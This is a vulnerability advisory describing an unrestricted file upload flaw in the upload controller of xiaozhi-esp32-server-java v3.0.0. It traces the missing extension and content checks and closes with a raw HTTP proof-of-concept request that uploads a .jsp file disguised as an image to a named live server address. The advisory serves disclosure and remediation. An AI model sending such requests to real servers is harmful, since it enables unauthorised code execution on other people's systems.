# Vulnerability Description

The `uploadFile` method in `FileUploadController.java` of the `xiaozhi-esp32-server-java v3.0.0` system contains an arbitrary file upload vulnerability: This method only generates a new filename by concatenating the original file extension with the UUID, without performing whitelist verification on file extensions (such as .jsp/.php). Furthermore, the local upload logic (`FileUploadUtils.uploadFile`) only checks the file size and does not verify the legality of the file content (such as image headers or executable script characteristics). An attacker can upload a malicious script file to the server. If the server parses the script with the corresponding extension, it will lead to remote code execution or server compromise.

# Vulnerability Analysis

The vulnerable class file src/main/java/com/xiaozhi/controller/FileUploadController.java only extracts the file extension using originalFilename.substring(originalFilename.lastIndexOf(".")), without filtering executable extensions such as .jsp/.php/.asp. This allows attackers to upload malicious scripts.

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.2h8qxnyyyp.webp)

Lines 55-56 construct the file upload directory. Lines 59-61 obtain the original filename of the uploaded file, split the file extension, and generate a new filename using UUID + extension. Line 65 inputs FileUploadUtils.smartUpload for upload processing. Therefore, the file extension is probably not a concern here. Follow up on the method to see if there are any other checks.

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.3d58d48qyh.webp)

The upload can be selectively uploaded to Tencent Cloud COS or locally based on the configuration file. Let's look at the local upload here, specifically the `uploadFile` method on line 135.

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.1vz3bd4p1v.webp)

Line 53 checks the file size; lines 56-59 create the file directory; lines 62-68 check if the directory exists; lines 71-74 create the file and call IOUtils.copy to write the content to the new file. Throughout this process, there is no file extension/content validation, which could lead to arbitrary file uploads.

# Vulnerability Reproduction

Test target URL: http://120.26.30.62/login?redirect=/ 

PoC:

```python
POST /api/file/upload HTTP/1.1
Host: 120.26.30.62
Connection: keep-alive
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Cookie: username=admin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxLzULmmlfW0hCjK
Content-Length: 278

------WebKitFormBoundaryuxLzULmmlfW0hCjK
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: image/png

test
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="type"

image
------WebKitFormBoundaryuxLzULmmlfW0hCjK--
```

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.8z6yqza8jg.webp)

